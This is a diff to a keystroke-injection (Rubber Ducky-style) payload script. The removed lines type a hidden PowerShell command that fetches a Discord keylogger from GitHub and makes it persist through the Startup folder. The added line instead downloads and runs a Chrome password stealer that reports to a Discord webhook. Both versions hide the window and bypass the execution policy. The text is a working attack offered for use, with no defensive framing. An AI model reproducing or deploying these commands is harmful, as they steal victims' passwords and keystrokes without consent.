@@ -5,7 +5,6 @@ STRING powershell
 DELAY 150
 ENTER
 DELAY 1700
-STRING powershell -w h -NoP -NonI -Exec Bypass -c "mkdir 'C:\system32\' ; cd C:\system32\ ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile C:\system32\sys-file.py ; py -m pip install discordwebhook pynput ; echo '@echo off' > startup.bat ; echo 'start /B pythonw.exe "C:\system32\sys-file.py"' >> startup.bat
-cp 'C:\system32\startup.bat' '$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' ; Python sys-file.py <your discord webhook here>"
+STRING powershell -w h -NoP -NonI -Exec Bypass -c "cd $env:USERPROFILE\Documents ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/chrome-password-stealer/starter.ps1 -OutFile $Env:USERPROFILE\Documents\starter.ps1 ; powershell.exe -File .\starter.ps1 -webhookUrl "<Your discord webhook here>""
 DELAY 200
 ENTER
